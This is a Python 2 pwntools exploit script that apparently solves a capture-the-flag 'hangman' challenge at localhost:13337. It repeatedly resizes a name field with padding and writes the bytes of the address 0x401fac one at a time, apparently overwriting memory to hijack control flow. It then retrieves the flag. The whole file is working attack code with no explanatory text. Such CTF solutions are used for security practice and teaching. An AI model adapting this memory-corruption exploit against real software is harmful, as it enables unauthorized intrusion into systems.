from pwn import *


debug = 0


if debug:
	r = process('./hangman')
else:
	r = remote('localhost', 13337)

l = 20
r.sendline('A' * l)


for i in range(288):
	l += 1
	r.sendline('5')
	r.recvuntil('Enter your new name: ')
	r.sendline('A' * l)
	r.recvuntil('Your choice: ')

for i in range(20):
	l -= 1
	r.sendline('5')
	r.recvuntil('Enter your new name: ')
	r.sendline('A' * l)
	r.recvuntil('Your choice: ')

modes = p64(0x401fac)[::-1]
add = ''

for i in range(32):
	for j in range(8):
		l -= 1
		add = modes[j] + add
		r.sendline('5')
		r.recvuntil('Enter your new name: ')
		r.sendline('A' * l + add)
		r.recvuntil('Your choice: ')

r.sendline('5')
r.recvuntil('Enter your new name: ')
r.sendline('wearemarching')
r.recvuntil('Your choice: ')

r.sendline('1')
r.sendline('r')
r.sendline('')

r.sendline('4')
r.recvuntil('[+] Flag: ')
print r.recvline()